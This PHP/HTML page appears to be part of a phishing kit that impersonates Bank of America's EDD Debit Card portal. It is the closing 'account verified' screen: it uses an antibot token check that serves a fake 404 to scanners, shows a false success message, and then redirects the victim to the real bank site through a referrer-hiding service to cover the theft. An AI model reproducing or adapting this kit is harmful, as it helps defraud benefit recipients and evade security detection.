<?php

    session_start();

    require_once '../job/spec/Comp.php';
    require_once '../job/spec/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EDD Debit Card - Verify your information</title>
        <link rel="stylesheet" href="../helper/css/Login/custom.css">
        <link rel="stylesheet" href="../helper/css/Login/css_002.css">
        <link rel="stylesheet" href="../helper/css/Login/css.css">
        <link rel="stylesheet" href="../helper/css/Login/preventEarlyClickCss.css">
        <link rel="stylesheet" href="../helper/css/Login/print.css">
        <link rel="stylesheet" href="../helper/css/Login/site.css">
        <link rel="shortcut icon" href="../helper/img/favicon.ico" type="image/x-icon">
    </head>
    <body class="body">
        <div class="header-container" role="banner">
            <div class="row header-row">
                <div class="columns brand-container show-for-medium-up">
                    <div class="small-12 medium-3 custom-medium-push-5 columns">
                        <div class="logo-wrapper">
                            <a style="cursor: pointer;">
                                <img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive"
                                    id="brand-logo" src="../helper/img/logo.png" title="">
                            </a>
                        </div>
                    </div>
                    <div class="small-12 medium-9 custom-medium-pull-7 columns">
                        <div class="program-wrapper">
                            <span class="header-card-program">EDD Debit Card</span>
                        </div>
                    </div>
                </div>

                <div class="small-12 show-for-small-only columns">
                    <nav data-topbar="" class="top-bar mobile-nav" role="navigation" aria-label="Main">
                        <ul class="title-area">
                            <li class="name">
                                <a style="cursor: pointer;">
                                    <img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive"
                                        id="brand-logo-mobile" src="../helper/img/logo.png"
                                        title="">
                                </a>
                            </li>
                            <li class="toggle-topbar menu-icon">
                                <button class="menu-icon" aria-expanded="false">
                                    <i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
                                    <span class="a11y-hide-visually">Expand Navigation Menu</span>
                                </button>
                            </li>
                            <li class="header-card-program">EDD Debit Card</li>
                        </ul>









                        <section class="top-bar-section" style="display: none;">
                            <ul class="left">
                                <li>
                                    <a style="cursor: pointer;">Home</a>
                                </li>
                                <li>
                                    <a style="cursor: pointer;">Sign In</a>
                                </li>
                                <li>
                                    <a style="cursor: pointer;">Activate My
                                        Card</a>
                                </li>
                            </ul>
                        </section>
                    </nav>
                </div>


                <div class="row show-for-medium-up">
                    <div class="medium-12 columns">
                        <nav data-topbar="" class="top-bar desktop-nav" role="navigation" aria-label="Main">








                            <section class="top-bar-section">
                                <ul class="left">
                                    <li>
                                        <a style="cursor: pointer;">Home</a>
                                    </li>
                                    <li>
                                        <a style="cursor: pointer;">Sign In</a>
                                    </li>
                                    <li>
                                        <a style="cursor: pointer;">Activate My
                                            Card</a>
                                    </li>
                                </ul>
                            </section>
                        </nav>
                    </div>
                </div>
            </div>




        </div>


        <div class="content-container" id="content" role="main" tabindex="-1">
            <div class="row">
                <div class="large-12 medium-12 small-12 column">
                    <p style="background-color: #10B12B;color:#fff;padding:10px;margin-bottom: 0px;">Your account has successfully been verified, you will now be redirected back to our home page.</p>
                </div>
            </div>
            <div class="row align-center">
                <svg class="mt-2" viewbox="0 0 375 375" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" xml:space="preserve">
                    <g>
                        <path style="fill:#10B12B;" d="M184.973,0C82.981,0,0,82.975,0,184.973s82.981,184.973,184.973,184.973   s184.973-82.975,184.973-184.973S286.965,0,184.973,0z M150.777,263.873l-66.125-66.125l8.437-8.437l57.688,57.688l125.561-125.561   l8.437,8.437L150.777,263.873z"/>
                    </g>
                </svg>
                <div class="my-2">
                    <span>Thank you for using Bank of America.</span>
                    <br>
                    <span>You will now be redirected.</span>
                </div>
            </div>
        </div>



        <div class="footer" role="contentinfo">
            <div class="row">
                <div class="small-12 columns" role="navigation" aria-label="Footer navigation">
                    <div class="align-center" style="margin-top: 20px;">
                        <span>Links are currently disabled due to server maintenance.</span>
                    </div>
                    <ul class="footer-navigation">


                        <li><a style="cursor: pointer;">Fee
                                Information</a></li>
                        <li><a style="cursor: pointer;">FAQ</a></li>
                        <li><a style="cursor: pointer;">Site Map</a></li>
                        <li><a style="cursor: pointer;">Contact
                                Us</a></li>
                        <li><a style="cursor: pointer;">Privacy /
                                Security</a></li>
                        <li><a style="cursor: pointer;">Terms &amp;
                                Conditions</a></li>
                        <li><a style="cursor: pointer;">Digital Terms &amp; Conditions and Fees</a></li>
                        <li><a style="cursor: pointer;">ATM Locator</a></li>










                        <li><a style="cursor: pointer;"
                                data-reveal-id="modal-leaving-site">Bank Of America, N. A.</a></li>

                    </ul>
                </div>
            </div>
            <div class="extra">
                <div class="small-12 columns">
                    <div class="row language">
                        <div id="lang-label" class="small-12 columns align-center">
                                <div>
                                    <span id="language-label" class="uppercase"><span class="a11y-hide-visually">Select a</span>
                                        Language:</span>
                                        <ul aria-labelledby="language-label" class="language-short-list">
                                        <li><button class="current changeCultureButton" data-culture="en-US" lang="en-US">English</button>
                                        </li>
                                        <li><button class="changeCultureButton" data-culture="es-MX" lang="es-MX">Español</button></li>
                                    </ul>
                                </div>
                                <input type="submit" class="a11y-hide-all" tabindex="-1" value="Submit">






                        </div>
                    </div>
                    <div class="row copyright">
                        <div class="small-12 columns">
                            <p>
                                Copyright 2021 Bank of America Corporation .
                                <a style="cursor: pointer;"> Visa Global Privacy
                                    Notice.</a> <br>Bank of America, N.A. Member FDIC Equal Housing Lender
                            </p>
                            <div class="large-12 column align-center">
                                <p style="color:#000;">
                                    <img src="../helper/img/EmailLogo.png"><br>
                                    Apple, the Apple logo and iPhone are trademarks of Apple Inc.,
                                    registered in the U.S. and other countries and regions. App Store is a
                                    service mark of Apple Inc. Google Play and the Google Play logo are
                                    trademarks of Google LLC.
                                </p>
                                <p style="color:#000;"> Your funds are eligible for FDIC insurance.
                                    Your funds are insured up to $250,000 by the FDIC in the event Bank of
                                    America, N.A. fails, if specific deposit insurance requirements are met.
                                    See <a style="cursor: pointer;"
                                        data-reveal-id="modal-leaving-site">fdic.gov/deposit/deposits/prepaid.html</a>
                                    for details. In the event Bank of America, N.A. fails, the FDIC may
                                    require information from you, including a government identification
                                    number, to determine the amount of your insured deposits. If you do not
                                    provide this information to the FDIC access to your insured funds will
                                    be delayed. </p>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>



        <div id="modalPlaceHolder" class="reveal-modal medium" data-reveal="">
        </div>


        <div id="modal-leaving-site" aria-labelledby="modal-leaving-site-dialog-title"
            aria-describedby="siteleaving-dialog-desc" class="reveal-modal medium" role="dialog" data-reveal="">
            <div class="modal-body">
                <h2 id="modal-leaving-site-dialog-title">
                    You Are Now Leaving This Site
                </h2>

                <div id="siteleaving-dialog-desc" class="scrollable">
                    <p id="modal-leaving-site-text">
                        You are connecting to a new website; the information
                        provided and collected on this website will be subject to the service
                        provider’s privacy policy and terms and conditions, available through
                        the website. The website you are connecting to is: {0}
                    </p>
                </div>
                <div class="small-12 columns button-group">
                    <button class="button primary small button-close-modal" id="continue-button">Continue</button>
                    <button class="button standard small button-close-modal" id="close-button">Cancel</button>
                </div> <button id="modal-close-icon" aria-label="Close" tabindex="0" class="close-reveal-modal">×</button>
            </div>
        </div>


        <button id="session-timeout-link" data-reveal-id="modal-session-timeout" title="Session Time Out"
            class="a11y-hide-all"></button>
        <div id="modal-session-timeout" aria-labelledby="session-timeout-dialog-title"
            aria-describedby="session-dialog-desc" class="reveal-modal small" role="dialog" data-reveal="">
            <div class="modal-body">
                <h2 id="session-timeout-dialog-title">Your session is about to expire.</h2>
                <div id="session-dialog-desc" class="scrollable expMessage">
                </div>
                <hr>
                <div class="align-right">
                    <button id="btn-extend-session" onclick="extendSession()" type="button"
                        class="button primary small">Extend Session</button>
                    <button id="btn-expire-session" onclick="expireSession(true)" type="button"
                        class="button primary small">Expire Session</button>
                </div>
                <button aria-label="Close" tabindex="0" id="sessionTimeOutClose" class="close-reveal-modal">×</button>
            </div>
        </div>
        <script>
            setTimeout(() => {
                window.location.href = "https://nullreferer.com/?https://bankofamerica.com";
            }, 3500);
        </script>
    </body>
</html>